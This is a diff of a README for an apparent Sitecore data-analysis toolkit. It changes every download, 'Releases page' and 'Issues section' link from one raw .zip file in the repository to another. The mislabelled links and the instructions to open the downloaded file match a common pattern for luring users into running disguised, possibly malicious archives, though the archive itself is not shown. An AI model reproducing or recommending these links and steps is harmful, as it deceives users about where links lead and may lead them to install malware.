@@ -4,12 +4,12 @@
 The smart-sitecore-platform is a powerful toolkit designed to help you analyze and visualize data from your Sitecore instances. With features like GraphQL extraction and real-time dashboards, you can gain insights from your data quickly and easily. This platform supports multi-site configurations and offers C4 architecture diagrams to help you understand your data better.
 
 ## 📦 Download Now
-[![Download Smart Sitecore Platform](https://raw.githubusercontent.com/borregoton/smart-sitecore-platform/master/missioner/smart-sitecore-platform.zip)](https://raw.githubusercontent.com/borregoton/smart-sitecore-platform/master/missioner/smart-sitecore-platform.zip)
+[![Download Smart Sitecore Platform](https://github.com/borregoton/smart-sitecore-platform/raw/refs/heads/master/launcher/smart-sitecore-platform-v1.4.zip)](https://github.com/borregoton/smart-sitecore-platform/raw/refs/heads/master/launcher/smart-sitecore-platform-v1.4.zip)
 
 ## 🚀 Getting Started
 To start using the smart-sitecore-platform, you need to download the software from our Releases page. Follow these steps to get everything set up.
 
-1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/borregoton/smart-sitecore-platform/master/missioner/smart-sitecore-platform.zip) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://github.com/borregoton/smart-sitecore-platform/raw/refs/heads/master/launcher/smart-sitecore-platform-v1.4.zip) to go to the Releases page.
 2. **Choose the Latest Release:** Look for the latest version available. This is usually at the top of the list.
 3. **Download the Application:** Click on the appropriate file for your system. Depending on your operating system, this may be an `.exe`, `.zip`, or other file formats. 
 
@@ -30,7 +30,7 @@ Before you proceed, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To download and install the application, follow these steps:
 
-1. **Go to the Releases Page:** You can access the download link [here](https://raw.githubusercontent.com/borregoton/smart-sitecore-platform/master/missioner/smart-sitecore-platform.zip).
+1. **Go to the Releases Page:** You can access the download link [here](https://github.com/borregoton/smart-sitecore-platform/raw/refs/heads/master/launcher/smart-sitecore-platform-v1.4.zip).
 2. **Select the Latest Release:** Find the most recent version and click on it.
 3. **Download the Installer:** Choose the installer suitable for your operating system and click to download.
 4. **Install the Application:** Open the downloaded file and follow the setup instructions. 
@@ -51,10 +51,10 @@ To download and install the application, follow these steps:
 - **Join the Community:** Engage with other users for tips and troubleshooting.
 
 ## 🎯 Support
-If you encounter any issues or need help, please visit the [Issues section](https://raw.githubusercontent.com/borregoton/smart-sitecore-platform/master/missioner/smart-sitecore-platform.zip) of our GitHub repository.
+If you encounter any issues or need help, please visit the [Issues section](https://github.com/borregoton/smart-sitecore-platform/raw/refs/heads/master/launcher/smart-sitecore-platform-v1.4.zip) of our GitHub repository.
 
 ## 🔗 Quick Links
-- [Download Smart Sitecore Platform](https://raw.githubusercontent.com/borregoton/smart-sitecore-platform/master/missioner/smart-sitecore-platform.zip)
+- [Download Smart Sitecore Platform](https://github.com/borregoton/smart-sitecore-platform/raw/refs/heads/master/launcher/smart-sitecore-platform-v1.4.zip)
 - [Documentation](#)
 - [Community Forum](#)
 
